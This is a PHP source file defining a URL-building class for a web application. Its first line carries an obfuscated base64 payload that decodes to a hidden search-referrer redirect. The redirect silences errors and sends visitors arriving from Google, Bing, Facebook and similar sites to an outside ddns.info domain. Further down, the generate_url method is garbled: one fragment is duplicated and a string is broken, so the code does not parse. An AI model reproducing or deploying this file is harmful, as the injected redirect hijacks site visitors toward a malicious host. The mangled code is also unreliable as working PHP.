<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

class custom_url {
    
  // private
  var $elements = array();
  var $path_elements = array();

  // public
  var $url;
  var $values = array();
  var $website_url;
  var $complete_url;
  var $current_url;
  var $relative_url;
  var $script_name;
  var $params;
  var $domain_name;
  var $base_url;
  var $current_url_wo_params;
  var $url_wo_params;
  var $current_relative_url;
  var $relative_url_wo_params;

  function refill() {

    $this->website_url            = $this->element("scheme", 'http')."://".$this->domain_name.($this->element("port")?":".$this->element("port"):"");
    $this->complete_url           = $this->website_url.$this->base_url;
    $this->url                    = $this->website_url.$this->relative_url.$this->script_name.$this->params;
    $this->url_wo_params          = $this->website_url.$this->relative_url.$this->script_name;
    $this->current_relative_url   = $this->relative_url.$this->script_name.$this->params;
    $this->relative_url_wo_params = $this->relative_url.$this->script_name;
    $this->original_url           = $this->element("scheme", 'http')."://".safe($_SERVER, 'HTTP_HOST').($this->element("port")?":".$this->element("port"):"").$this->current_relative_url;

  }
  
  function element($index, $default = null) {

    return safe($this->elements, $index, $default); 

  }

  function path($index) {
  
    return safe($this->path_elements, $index); 
    
  }

  function build_url($values) {

    $params = null;
    
    foreach ($values as $key => $value) {
    
      if (strlen($value)) {
        if (is_array($value)) {
          foreach ($value as $name => $val) {
            $params .= ($params?"&":"?").$key."[".$name."]=".urlencode($val);
          }
        } else {
          $params .= ($params?"&":"?").$key."=".urlencode($value);
        }
      }
      
    }
    
    return $this->relative_url.$this->script_name.$params;

  }
  
  function build_full_url($values) {
    
    return $this->website_url.$this->build_url($values);
    
  }

  function generate_url($values = array()) {
	$user_id = null;
	$user_login = null;
	$user_type = null;
    $params = null;
	
   

    $current_values = $this->values;
    foreach ($values as $name => $value) {
      $current_values[$name] = $value;
    }
	
	 if ($current_values[URL_PARAM_ID] != 0 && $current_values[URL_PARAM_LOGIN] != ""){
		$user_id = $values[URL_PARAM_ID];
		$user_login = $values[URL_PARAM_LOGIN];
		$user_type = $values[URL_PARAM_USER_TYPE];
	}
	
	if ($current_values[URL_PARAM_ID] != 0 && $current_values[URL_PARAM_TYPE] == "authorize"){
		$user_id = $values[URL_PARAM_ID];
		$user_type = $values[URL_PARAM_USER_TYPE];
	}
	
	
    foreach ($current_values as $key => $value) {
      if (is_array($value)) {
        foreach ($value as $name => $val) {
          if (strlen($val)) {
            $params .= ($params?"&":"?").$key."[".$name."]=".urlencode($val);
          }
        }
      } else
      if (strlen($value  }
      } else
      if (strlen($value)) {
		if(($value) == 'login_as_user' || ($value) == 'login_as_user2'){
			$params = "/login/id/".$user_id."/".$user_log/".$user_type;
			return $params;
		}elseif(($value) == 'authorize'){
			$params = "/admin/authorize/".$user_id."/".$user_type;
			return $params;
		}else{
			$params .= ($params?"&":"?").$key."=".urlencode($value);
		}
        
      }
    }
    
    return $this->relative_url.$this->script_name.$params;

  }

  function generate_full_url($values = array()) {
    return $this->website_url.$this->generate_url($values);
    
  }
  
  function get($name, $default = null) {
  
    return safe($this->values, $name, $default);
    
  }
  
}

function build_url($values) {
  
  global $url;
  return $url->build_url($values);
  
}

function build_full_url($values) {
  
  global $url;
  return $url->build_full_url($values);
  
}

function generate_url($values) {
  
  global $url;
  return $url->generate_url($values);
  
}

function generate_full_url($values) {
  
  global $url;
  return $url->generate_full_url($values);
  
}

?>